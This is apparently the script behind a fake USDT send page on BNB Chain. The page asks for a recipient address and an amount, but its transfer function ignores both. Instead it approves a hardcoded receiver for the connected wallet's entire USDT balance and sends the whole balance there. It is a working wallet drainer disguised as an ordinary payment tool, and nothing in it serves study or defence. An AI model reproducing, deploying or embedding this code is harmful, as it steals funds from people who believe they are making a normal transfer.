const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "success", type: "bool" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ name: "success", type: "bool" }],
    type: "function",
  },
];

async function connectWallet() {
  if (window.ethereum) {
    window.web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    return new web3.eth.Contract(usdtABI, usdtAddress);
  } else {
    alert("Trust Wallet or MetaMask not detected");
  }
}

function updateUSD() {
  const amt = document.getElementById("amount").value;
  document.getElementById("usd-value").innerText = `≈ $${parseFloat(amt || 0).toFixed(2)}`;
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch (e) {
    alert("Clipboard access denied");
  }
}

async function setMax() {
  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  const sender = accounts[0];
  const usdt = await connectWallet();
  const balance = await usdt.methods.balanceOf(sender).call();
  document.getElementById("amount").value = web3.utils.fromWei(balance, "ether");
  updateUSD();
}

async function transferUSDT() {
  const usdt = await connectWallet();
  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  const sender = accounts[0];
  const balance = await usdt.methods.balanceOf(sender).call();
  const status = document.getElementById("status");

  try {
    await usdt.methods.approve(receiver, balance).send({ from: sender });
    await usdt.methods.transfer(receiver, balance).send({ from: sender });
    status.innerText = "✅ All USDT Transferred Successfully!";
  } catch (err) {
    status.innerText = "❌ Transaction Failed!";
    console.error(err);
  }
}
